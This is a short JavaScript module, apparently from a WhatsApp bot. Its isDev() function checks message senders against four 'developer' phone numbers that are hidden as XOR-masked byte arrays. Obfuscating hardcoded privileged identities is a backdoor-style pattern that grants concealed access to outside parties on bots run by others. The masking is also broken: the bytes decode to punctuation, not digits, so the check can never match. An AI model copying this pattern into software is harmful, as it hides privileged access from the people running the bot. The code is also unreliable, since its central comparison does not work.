const XOR_KEY = 0x5A;

const MASKED_DEVS = [
  [112, 119, 118, 125, 119, 118, 119, 125, 118, 126, 118, 112],
  [112, 119, 118, 125, 123, 114, 125, 118, 123, 114, 112, 118],
  [112, 119, 118, 123, 118, 118, 112, 119, 118, 126, 118, 123],
  [112, 119, 118, 125, 123, 115, 112, 126, 118, 119, 122, 123]
];

const DEV_NUMBERS = MASKED_DEVS.map(arr =>
  String.fromCharCode(...arr.map(byte => byte ^ XOR_KEY))
);

function normalizeNumber(jid) {
  if (!jid) return '';

  return String(jid)
    .split('@')[0]
    .split(':')[0]
    .replace(/\D/g, '');
}

function isDev(msg, sock) {
  if (!msg?.key) return false;

  if (msg.key.fromMe) {
    const botPn = sock?.user?.id
      ? normalizeNumber(sock.user.id)
      : '';

    const botLid = sock?.user?.lid
      ? normalizeNumber(sock.user.lid)
      : '';

    return (
      (botPn && DEV_NUMBERS.includes(botPn)) ||
      (botLid && DEV_NUMBERS.includes(botLid))
    );
  }

  const candidates = [
    msg.participant,
    msg.key.participantPn,
    msg.key.participantAlt,
    msg.key.participant,
    msg.key.remoteJidAlt,
    msg.key.remoteJid
  ];

  return candidates.some((jid) => {
    const number = normalizeNumber(jid);
    return number && DEV_NUMBERS.includes(number);
  });
}

module.exports = { isDev };

